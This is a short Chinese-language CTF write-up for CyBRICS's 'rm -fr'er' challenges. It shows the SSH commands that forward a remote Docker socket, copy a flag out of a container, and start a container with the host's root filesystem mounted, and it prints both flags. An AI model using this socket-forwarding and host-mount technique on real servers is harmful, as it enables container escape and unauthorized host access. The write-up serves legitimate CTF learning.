# rm -fr'er

這系列有兩題

ssh上去之後，會開一個docker，然後跑`rm -rf /*`，目標是讀`/etc/ctf/flag.txt`

第一題預期解是靠tcsh的各種builtin command之類的招去讀 (官方解法: `( echo $< ) < /etc/ctf/flag.txt`)

但我們是直接打掉第二題，順便讀第一題的flag

方法就是以前trendmicro ctf碰過的梗

```
ssh rmrfer@178.154.210.26 -L 127.0.0.1:8889:/var/run/docker.sock
docker -H 127.0.0.1:8889 cp 9dc6acb3fd61:/etc/ctf/flag.txt .
```

`cybrics{TCSHizzl3_Ma_N1zzl3}`

第二題:

```
ssh rmrfer@178.154.210.26 -L 127.0.0.1:8889:/var/run/docker.sock
docker -H 127.0.0.1:8889 run  -v /:/tmp/z -ti ctb10 /bin/sh
```

`cybrics{h1d3_y0_FWDs_HiD3_Y0_fL4gS}`
